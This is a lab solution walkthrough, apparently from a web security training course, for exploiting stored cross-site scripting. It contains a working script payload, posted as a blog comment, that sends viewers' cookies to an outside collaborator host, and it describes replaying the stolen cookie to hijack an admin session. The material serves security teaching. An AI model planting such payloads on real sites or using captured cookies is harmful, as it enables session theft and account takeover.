### Lab: Exploiting cross-site scripting to steal cookies

1.  Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the Burp menu, and launch the [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client).
2.  Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3.  Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:  
    `<script>  
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {  
    method: 'POST',  
    mode: 'no-cors',  
    body:document.cookie  
    });  
    </script>`  
    This script will make anyone who views the comment issue a POST request to `burpcollaborator.net` containing their cookie.
4.  Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5.  Take a note of the value of the victim's cookie in the POST body.
6.  Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

